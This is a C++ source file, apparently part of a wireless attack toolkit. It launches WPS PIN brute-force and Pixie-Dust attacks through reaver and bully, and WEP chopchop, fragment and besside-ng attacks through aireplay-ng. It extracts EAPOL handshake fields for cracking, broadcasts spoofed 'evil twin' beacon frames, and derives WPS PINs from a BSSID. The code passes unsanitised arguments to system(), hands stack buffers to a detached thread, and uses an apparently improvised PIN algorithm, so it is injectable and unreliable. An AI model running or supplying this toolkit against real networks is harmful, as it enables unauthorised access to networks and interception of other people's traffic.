#include "offensive_plus.h"
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>
#include <fstream>
#include <sstream>
#include <iomanip>

static int g_evil_twin_running = 0;
static std::thread g_evil_twin_thread;

static int _raw_socket(const char* iface) {
    struct sockaddr_ll sll;
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    return fd;
}

static uint8_t _hex_char(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

static void _mac_bytes(const char* mac_str, uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        if (mac_str && strlen(mac_str) >= 17) {
            mac[i] = (_hex_char(mac_str[i*3]) << 4) | _hex_char(mac_str[i*3+1]);
        } else {
            mac[i] = 0;
        }
    }
}

extern "C" int hackit_wps_attack(const char* iface, const char* bssid, const char* pin, int pixie) {
    char cmd[512];
    if (pixie) {
        snprintf(cmd, sizeof(cmd), "wash -i %s 2>/dev/null | grep -i '%s'", iface, bssid ? bssid : "");
        FILE* fp = popen(cmd, "r");
        if (fp) pclose(fp);
    }
    if (pin && strlen(pin) > 0) {
        snprintf(cmd, sizeof(cmd),
            "timeout 30 reaver -i %s -b %s -p %s -vv 2>/dev/null || "
            "timeout 30 bully %s -b %s -p %s -v 3 2>/dev/null",
            iface, bssid ? bssid : "FF:FF:FF:FF:FF:FF", pin,
            iface, bssid ? bssid : "FF:FF:FF:FF:FF:FF", pin);
    } else {
        snprintf(cmd, sizeof(cmd),
            "timeout 120 reaver -i %s -b %s -K 1 -vv 2>/dev/null || "
            "timeout 120 bully %s -b %s -v 3 2>/dev/null",
            iface, bssid ? bssid : "FF:FF:FF:FF:FF:FF",
            iface, bssid ? bssid : "FF:FF:FF:FF:FF:FF");
    }
    return system(cmd);
}

extern "C" int hackit_wep_attack(const char* iface, const char* bssid, const char* output, int mode) {
    char cmd[512];
    if (mode == 0) {
        snprintf(cmd, sizeof(cmd), "timeout 60 aireplay-ng --chopchop -b %s -h FF:FF:FF:FF:FF:FF %s",
            bssid ? bssid : "FF:FF:FF:FF:FF:FF", iface);
    } else if (mode == 1) {
        snprintf(cmd, sizeof(cmd), "timeout 60 aireplay-ng --fragment -b %s -h FF:FF:FF:FF:FF:FF %s",
            bssid ? bssid : "FF:FF:FF:FF:FF:FF", iface);
    } else {
        if (output) {
            snprintf(cmd, sizeof(cmd), "timeout 300 besside-ng %s -b %s -o %s 2>/dev/null",
                iface, bssid ? bssid : "FF:FF:FF:FF:FF:FF", output);
        } else {
            snprintf(cmd, sizeof(cmd), "timeout 300 besside-ng %s -b %s 2>/dev/null",
                iface, bssid ? bssid : "FF:FF:FF:FF:FF:FF");
        }
    }
    return system(cmd);
}

extern "C" int hackit_parse_eapol(const char* pcap_file, EapolResult* results, int* count) {
    if (!pcap_file || !results || !count) return -1;
    std::ifstream f(pcap_file, std::ios::binary);
    if (!f) return -1;
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "tshark -r %s -Y 'eapol' -T fields "
        "-e wlan.sa -e wlan.da -e eapol.keydes.keyinfo -e eapol.keydes.replay_counter "
        "-e eapol.keydes.key_mic -e eapol.keydes.nonce 2>/dev/null", pcap_file);
    FILE* fp = popen(cmd, "r");
    if (!fp) return -1;
    char line[1024];
    int idx = 0;
    int max_count = *count;
    while (fgets(line, sizeof(line), fp) && idx < max_count) {
        char* tok = strtok(line, "\t\n");
        if (!tok) continue;
        results[idx].client_mac = tok;
        tok = strtok(nullptr, "\t\n");
        if (tok) results[idx].ap_mac = tok;
        tok = strtok(nullptr, "\t\n");
        if (tok) {
            int ki = strtol(tok, nullptr, 0);
            results[idx].msg_type = (ki >> 2) & 3;
        }
        tok = strtok(nullptr, "\t\n");
        if (tok) results[idx].replay_counter = tok;
        tok = strtok(nullptr, "\t\n");
        if (tok) results[idx].key_mic = tok;
        tok = strtok(nullptr, "\t\n");
        if (tok) results[idx].anonce = tok;
        idx++;
    }
    *count = idx;
    pclose(fp);
    return 0;
}

static void _evil_twin_loop(const char* iface, const char* ssid, int channel, const char* bssid_str) {
    int fd = _raw_socket(iface);
    if (fd < 0) return;
    uint8_t bssid[6];
    _mac_bytes(bssid_str, bssid);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "iw dev %s set channel %d", iface, channel);
    system(cmd);
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    uint16_t seq = 0;
    while (g_evil_twin_running) {
        uint8_t frame[512] = {0};
        uint16_t fc = 0x0080;
        memcpy(frame, &fc, 2);
        memset(frame+4, 0xFF, 6);
        memcpy(frame+10, bssid, 6);
        memcpy(frame+16, bssid, 6);
        frame[22] = (seq & 0x0F) << 4;
        frame[23] = (seq >> 4) & 0xFF;
        seq++;
        int off = 24;
        uint64_t ts = time(nullptr);
        memcpy(frame+off, &ts, 8); off += 8;
        uint16_t bi = 100;
        memcpy(frame+off, &bi, 2); off += 2;
        uint16_t caps = 0x0431;
        memcpy(frame+off, &caps, 2); off += 2;
        int ssid_len = strlen(ssid);
        if (ssid_len > 32) ssid_len = 32;
        frame[off++] = 0;
        frame[off++] = ssid_len;
        memcpy(frame+off, ssid, ssid_len); off += ssid_len;
        frame[off++] = 1; frame[off++] = 8;
        uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
        memcpy(frame+off, rates, 8); off += 8;
        frame[off++] = 3; frame[off++] = 1; frame[off++] = channel;
        sendto(fd, frame, off, 0, (struct sockaddr*)&dest, sizeof(dest));
        usleep(100000);
    }
    close(fd);
}

extern "C" int hackit_evil_twin_start(const char* iface, const char* ssid, int channel, const char* bssid) {
    if (g_evil_twin_running) return -1;
    g_evil_twin_running = 1;
    char ssid_buf[64];
    char bssid_buf[18];
    strncpy(ssid_buf, ssid ? ssid : "HackIT-Free", sizeof(ssid_buf));
    strncpy(bssid_buf, bssid ? bssid : "02:00:00:00:00:01", sizeof(bssid_buf));
    g_evil_twin_thread = std::thread(_evil_twin_loop, iface, ssid_buf, channel, bssid_buf);
    g_evil_twin_thread.detach();
    return 0;
}

extern "C" int hackit_evil_twin_stop(void) {
    g_evil_twin_running = 0;
    return 0;
}

extern "C" int hackit_compute_wps_pin(const char* bssid, char* pin_out) {
    if (!bssid || !pin_out) return -1;
    uint8_t mac[6];
    _mac_bytes(bssid, mac);
    uint32_t accum = 0;
    for (int i = 0; i < 6; i++) {
        accum = (accum << 8) | mac[i];
        accum = (accum >> 1) | (accum << 31);
    }
    int pin = (accum % 10000000) + (accum % 9999999);
    if (pin < 1000000) pin += 1000000;
    int checksum = 0;
    int temp = pin;
    for (int i = 0; i < 7; i++) {
        checksum += (temp % 10) * (i % 2 ? 3 : 1);
        temp /= 10;
    }
    int check_digit = (10 - (checksum % 10)) % 10;
    sprintf(pin_out, "%07d%01d", pin, check_digit);
    return 0;
}
